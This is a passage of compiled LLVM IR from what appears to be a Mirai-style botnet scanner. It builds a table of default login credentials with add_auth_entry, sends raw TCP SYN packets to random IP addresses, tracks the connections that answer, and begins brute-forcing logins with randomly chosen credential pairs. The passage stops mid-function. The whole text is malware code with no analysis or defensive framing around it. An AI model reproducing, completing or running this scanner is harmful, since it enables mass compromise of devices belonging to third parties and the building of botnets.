  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i64 0, i64 0), i16 zeroext 6)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i16 zeroext 1)
  %55 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %56 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %57 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 0
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 0
  %59 = bitcast i32* %7 to i8*
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %61 = bitcast i8* %60 to i32*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %63 = bitcast i8* %56 to i16*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %65 = bitcast i8* %64 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %67 = bitcast i8* %66 to i16*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %69 = bitcast i8* %68 to i32*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %71 = bitcast i8* %70 to i32*
  %72 = bitcast %struct.sockaddr_in* %5 to i8*
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %76 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit266

.loopexit266.loopexit:                            ; preds = %.loopexit
  br label %.loopexit266

.loopexit266:                                     ; preds = %.loopexit266.loopexit, %43
  %.0240 = phi i32 [ undef, %43 ], [ %.1241, %.loopexit266.loopexit ]
  %77 = load i32, i32* @fake_time, align 4
  %78 = icmp eq i32 %77, %.0240
  br i1 %78, label %.loopexit269, label %.preheader268

.preheader268:                                    ; preds = %.loopexit266
  store i32 0, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %.preheader268, %79
  call void @llvm.memset.p0i8.i64(i8* nonnull %72, i8 0, i64 16, i32 4, i1 false)
  %80 = call i32 @rand_next() #9
  %81 = trunc i32 %80 to i16
  store i16 %81, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %82, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %83 = call fastcc i32 @get_random_ip()
  store i32 %83, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %84 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @scanner_rawpkt to i16*), i32 20) #9
  store i16 %84, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %47, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %85 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %85, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %86 = call zeroext i16 @htons(i16 zeroext 20) #11
  %87 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20), i16 zeroext %86, i32 20) #9
  store i16 %87, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %73, align 4
  %88 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %88, i32* %74, align 4
  %89 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %89, i16* %75, align 2
  %90 = load i32, i32* @rsck, align 4
  %91 = call i64 @sendto(i32 %90, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %76, i32 16) #9
  %92 = load i32, i32* %1, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %1, align 4
  %94 = icmp slt i32 %93, 760
  br i1 %94, label %79, label %.loopexit269.loopexit

.loopexit269.loopexit:                            ; preds = %79
  br label %.loopexit269

.loopexit269:                                     ; preds = %.loopexit269.loopexit, %.loopexit266
  %.1241 = phi i32 [ %.0240, %.loopexit266 ], [ %77, %.loopexit269.loopexit ]
  %95 = tail call i32* @__errno_location() #11
  store i32 0, i32* %95, align 4
  %96 = load i32, i32* @rsck, align 4
  %97 = call i64 @recvfrom(i32 %96, i8* nonnull %55, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #9
  %98 = trunc i64 %97 to i32
  %99 = icmp slt i32 %98, 1
  br i1 %99, label %.thread, label %.lr.ph279.preheader

.lr.ph279.preheader:                              ; preds = %.loopexit269
  br label %.lr.ph279

.lr.ph279:                                        ; preds = %.lr.ph279.preheader, %.backedge
  %100 = phi i64 [ %142, %.backedge ], [ %97, %.lr.ph279.preheader ]
  %.0238278 = phi i32 [ %.0238.be, %.backedge ], [ 0, %.lr.ph279.preheader ]
  %101 = load i32, i32* %95, align 4
  %102 = icmp eq i32 %101, 11
  br i1 %102, label %.thread.loopexit318, label %103

; <label>:103:                                    ; preds = %.lr.ph279
  %sext = shl i64 %100, 32
  %104 = ashr exact i64 %sext, 32
  %105 = icmp ult i64 %104, 40
  br i1 %105, label %.backedge, label %106

; <label>:106:                                    ; preds = %103
  %107 = load i32, i32* %61, align 16
  %108 = load i32, i32* @LOCAL_ADDR, align 4
  %109 = icmp eq i32 %107, %108
  %110 = load i8, i8* %62, align 1
  %111 = icmp eq i8 %110, 6
  %or.cond294 = and i1 %109, %111
  %112 = load i16, i16* %63, align 4
  %113 = icmp eq i16 %112, %47
  %or.cond296 = and i1 %or.cond294, %113
  %114 = load i16, i16* %65, align 2
  %115 = icmp eq i16 %114, %40
  %or.cond298 = and i1 %or.cond296, %115
  br i1 %or.cond298, label %116, label %.backedge

; <label>:116:                                    ; preds = %106
  %117 = load i16, i16* %67, align 16
  %118 = and i16 %117, 5888
  %119 = icmp eq i16 %118, 4608
  br i1 %119, label %120, label %.backedge

; <label>:120:                                    ; preds = %116
  %121 = load i32, i32* %69, align 4
  %122 = call i32 @ntohl(i32 %121) #11
  %123 = add i32 %122, -1
  %124 = call i32 @htonl(i32 %123) #11
  %125 = load i32, i32* %71, align 4
  %126 = icmp eq i32 %124, %125
  br i1 %126, label %.preheader, label %.backedge

.preheader:                                       ; preds = %120
  %127 = icmp slt i32 %.0238278, 628
  br i1 %127, label %.lr.ph.preheader, label %.thread.loopexit318

.lr.ph.preheader:                                 ; preds = %.preheader
  %128 = sext i32 %.0238278 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %132
  %indvars.iv = phi i64 [ %128, %.lr.ph.preheader ], [ %indvars.iv.next, %132 ]
  %129 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 16
  %130 = load i32, i32* %129, align 8
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %134, label %132

; <label>:132:                                    ; preds = %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %133 = icmp slt i64 %indvars.iv.next, 628
  br i1 %133, label %.lr.ph, label %.thread.loopexit

; <label>:134:                                    ; preds = %.lr.ph
  %135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv
  %136 = icmp eq %struct.scanner_connection* %135, null
  br i1 %136, label %.thread.loopexit318, label %137

; <label>:137:                                    ; preds = %134
  %138 = trunc i64 %indvars.iv to i32
  %139 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 15
  store i32 %124, i32* %139, align 4
  %140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 13
  store i16 %47, i16* %140, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %135)
  br label %.backedge

.backedge:                                        ; preds = %137, %103, %106, %120, %116
  %.0238.be = phi i32 [ %.0238278, %103 ], [ %.0238278, %106 ], [ %.0238278, %120 ], [ %138, %137 ], [ %.0238278, %116 ]
  store i32 0, i32* %95, align 4
  %141 = load i32, i32* @rsck, align 4
  %142 = call i64 @recvfrom(i32 %141, i8* nonnull %55, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #9
  %143 = trunc i64 %142 to i32
  %144 = icmp slt i32 %143, 1
  br i1 %144, label %.thread.loopexit318, label %.lr.ph279

.thread.loopexit:                                 ; preds = %132
  br label %.thread

.thread.loopexit318:                              ; preds = %.preheader, %.lr.ph279, %.backedge, %134
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit318, %.thread.loopexit, %.loopexit269
  %145 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %57) #9, !srcloc !3
  %146 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %58) #9, !srcloc !4
  store i32 0, i32* %1, align 4
  br label %147

; <label>:147:                                    ; preds = %.thread, %.thread257
  %.0242287 = phi i32 [ 0, %.thread ], [ %.1243, %.thread257 ]
  %.0244286 = phi i32 [ 0, %.thread ], [ %.1245, %.thread257 ]
  %storemerge248285 = phi i32 [ 0, %.thread ], [ %196, %.thread257 ]
  %148 = sext i32 %storemerge248285 to i64
  %149 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148
  %150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148, i32 16
  %151 = load i32, i32* %150, align 8
  %152 = icmp eq i32 %151, 0
  br i1 %152, label %.thread257, label %153

; <label>:153:                                    ; preds = %147
  %154 = icmp ne i32 %151, 1
  %155 = select i1 %154, i32 30, i32 5
  %156 = load i32, i32* @fake_time, align 4
  %157 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148, i32 3
  %158 = load i32, i32* %157, align 4
  %159 = sub i32 %156, %158
  %160 = icmp ugt i32 %159, %155
  br i1 %160, label %161, label %177

; <label>:161:                                    ; preds = %153
  %162 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148, i32 2
  %163 = load i32, i32* %162, align 8
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %.thread257, label %165

; <label>:165:                                    ; preds = %161
  %166 = call i32 @close(i32 %163) #9
  store i32 -1, i32* %162, align 8
  %167 = load i32, i32* %150, align 8
  %168 = icmp ugt i32 %167, 2
  %169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148, i32 9
  br i1 %168, label %170, label %176

; <label>:170:                                    ; preds = %165
  %171 = load i8, i8* %169, align 4
  %172 = add i8 %171, 1
  store i8 %172, i8* %169, align 4
  %173 = icmp eq i8 %172, 10
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %170
  call void @fdclose(%struct.scanner_connection* nonnull %149, i32 undef)
  br label %.thread257

; <label>:175:                                    ; preds = %170
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %149)
  br label %.thread257

; <label>:176:                                    ; preds = %165
  store i8 0, i8* %169, align 4
  store i32 0, i32* %150, align 8
  br label %.thread257

; <label>:177:                                    ; preds = %153
  %cond = icmp eq i32 %151, 1
  %178 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %148, i32 2
  %179 = load i32, i32* %178, align 8
  %180 = srem i32 %179, 64
  %181 = zext i32 %180 to i64
  %182 = shl i64 1, %181
  %183 = sdiv i32 %179, 64
  %184 = sext i32 %183 to i64
  br i1 %cond, label %185, label %190

; <label>:185:                                    ; preds = %177
  %186 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %184
  %187 = load i64, i64* %186, align 8
  %188 = or i64 %182, %187
  store i64 %188, i64* %186, align 8
  %189 = icmp sgt i32 %179, %.0244286
  %..0244 = select i1 %189, i32 %179, i32 %.0244286
  br label %.thread257

; <label>:190:                                    ; preds = %177
  %191 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %184
  %192 = load i64, i64* %191, align 8
  %193 = or i64 %182, %192
  store i64 %193, i64* %191, align 8
  %194 = icmp sgt i32 %179, %.0242287
  %..0242 = select i1 %194, i32 %179, i32 %.0242287
  br label %.thread257

.thread257:                                       ; preds = %147, %190, %185, %176, %175, %174, %161
  %.1245 = phi i32 [ %.0244286, %161 ], [ %.0244286, %174 ], [ %.0244286, %175 ], [ %.0244286, %176 ], [ %..0244, %185 ], [ %.0244286, %190 ], [ %.0244286, %147 ]
  %.1243 = phi i32 [ %.0242287, %161 ], [ %.0242287, %174 ], [ %.0242287, %175 ], [ %.0242287, %176 ], [ %.0242287, %185 ], [ %..0242, %190 ], [ %.0242287, %147 ]
  %195 = load i32, i32* %1, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %1, align 4
  %197 = icmp slt i32 %196, 628
  br i1 %197, label %147, label %198

; <label>:198:                                    ; preds = %.thread257
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %4, align 16
  %199 = icmp sgt i32 %.1245, %.1243
  %200 = select i1 %199, i32 %.1245, i32 %.1243
  %201 = add nsw i32 %200, 1
  %202 = call i32 @select(i32 %201, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #9
  %203 = call i64 @time(i64* null) #9
  %204 = trunc i64 %203 to i32
  store i32 %204, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %205

; <label>:205:                                    ; preds = %198, %.loopexit
  %storemerge249290 = phi i32 [ 0, %198 ], [ %524, %.loopexit ]
  %206 = sext i32 %storemerge249290 to i64
  %207 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206
  %208 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 2
  %209 = load i32, i32* %208, align 8
  %210 = icmp eq i32 %209, -1
  br i1 %210, label %.loopexit, label %211

; <label>:211:                                    ; preds = %205
  %212 = sdiv i32 %209, 64
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %213
  %215 = load i64, i64* %214, align 8
  %216 = srem i32 %209, 64
  %217 = zext i32 %216 to i64
  %218 = shl i64 1, %217
  %219 = and i64 %215, %218
  %220 = icmp eq i64 %219, 0
  br i1 %220, label %240, label %221

; <label>:221:                                    ; preds = %211
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %222 = call i32 @getsockopt(i32 %209, i32 1, i32 4, i8* nonnull %59, i32* nonnull %8) #9
  %223 = load i32, i32* %7, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %230, label %225

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* %208, align 8
  %227 = call i32 @close(i32 %226) #9
  store i32 -1, i32* %208, align 8
  %228 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 9
  store i8 0, i8* %228, align 4
  %229 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 16
  store i32 0, i32* %229, align 8
  br label %.loopexit

; <label>:230:                                    ; preds = %221
  %231 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 16
  store i32 2, i32* %231, align 8
  %232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 1, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %235, label %238

; <label>:235:                                    ; preds = %230
  %236 = call fastcc %struct.scanner_auth* @random_auth_entry()
  %237 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %207, i64 0, i32 0
  store %struct.scanner_auth* %236, %struct.scanner_auth** %237, align 8
  br label %238

; <label>:238:                                    ; preds = %230, %235
  %239 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 4
  store i32 0, i32* %239, align 8
  %.pre = load i32, i32* %208, align 8
  br label %240

; <label>:240:                                    ; preds = %211, %238
  %241 = phi i32 [ %209, %211 ], [ %.pre, %238 ]
  %242 = sdiv i32 %241, 64
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %243
  %245 = load i64, i64* %244, align 8
  %246 = srem i32 %241, 64
  %247 = zext i32 %246 to i64
  %248 = shl i64 1, %247
  %249 = and i64 %248, %245
  %250 = icmp eq i64 %249, 0
  br i1 %250, label %.loopexit, label %.thread263.preheader

.thread263.preheader:                             ; preds = %240
  %251 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 16
  %252 = load i32, i32* %251, align 8
  %253 = icmp eq i32 %252, 0
  br i1 %253, label %.loopexit, label %.lr.ph289

.lr.ph289:                                        ; preds = %.thread263.preheader
  %254 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 4
  %255 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 7, i64 0
  %256 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 7, i64 6144
  %257 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 3
  %258 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %207, i64 0, i32 0
  %259 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 9
  %260 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 5
  %261 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 1, i32 0
  %262 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 8, i64 0
  %263 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 15
  %264 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 1, i32 1
  %265 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 12
  br label %268

.thread263.loopexitthread-pre-split:              ; preds = %441, %514
  %.pr = load i32, i32* %251, align 8
  br label %.thread263.loopexit

.thread263.loopexit.loopexit:                     ; preds = %294
  br label %.thread263.loopexit

.thread263.loopexit:                              ; preds = %.thread263.loopexit.loopexit, %.thread263.loopexitthread-pre-split
  %266 = phi i32 [ %.pr, %.thread263.loopexitthread-pre-split ], [ %295, %.thread263.loopexit.loopexit ]
  %267 = icmp eq i32 %266, 0
  br i1 %267, label %.loopexit.loopexit, label %268

; <label>:268:                                    ; preds = %.lr.ph289, %.thread263.loopexit
  %269 = load i32, i32* %254, align 8
  %270 = icmp sgt i32 %269, 7168
  br i1 %270, label %271, label %273

; <label>:271:                                    ; preds = %268
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %255, i8* nonnull %256, i64 2048, i32 1, i1 false)
  %272 = add nsw i32 %269, -6144
  store i32 %272, i32* %254, align 8
  br label %273

; <label>:273:                                    ; preds = %271, %268
  store i32 0, i32* %95, align 4
  %274 = load i32, i32* %208, align 8
  %275 = load i32, i32* %254, align 8
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 7, i64 %276
  %278 = sub nsw i32 8192, %275
  %279 = call i32 @recv_strip_null(i32 %274, i8* %277, i32 %278, i32 16384)
